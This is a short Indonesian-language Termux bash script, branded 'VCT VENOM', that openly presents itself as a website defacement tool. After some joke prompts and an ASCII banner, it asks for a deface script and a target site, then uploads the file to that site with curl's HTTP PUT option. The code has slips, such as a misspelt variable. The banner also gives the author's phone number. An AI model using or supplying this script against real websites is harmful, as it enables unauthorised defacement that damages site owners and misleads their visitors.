clear
echo "siapa nama anda?" | lolcat
read nama  
clear
echo "sudah punya pacar?" | lolcat
read nama 
clear

echo "INGAT GUNAKAN DENGAN BIJAK" | lolcat

figlet "D E F A C E" | lolcat
echo  "____________________________________________________________________________________________________________________

                                                      V
      Tools    : VCT VENOM                            E 
      Creadby  : Mr.ardi.                             N
      Contact  : 085697392260                         O  
                                                      M
____________________________________________________________________________________________________________________" | lolcat
echo     "Semoga hari anda menyenangkan" | lolcat

echo "pastikan anda sudah membuat script deface" |lolcat
read -p "masukan nama script deface anda : " script; 
read -p "masukan nama web yang ingin anda deface : " web; 
echo " MEMPROSES TUNGGU......................................." | lolcat
termux-setup-storage
curl -T /sdcard/$scrip $web
echo "buka hasil deface nya disini $web/$script thanks for allah" | lolcat
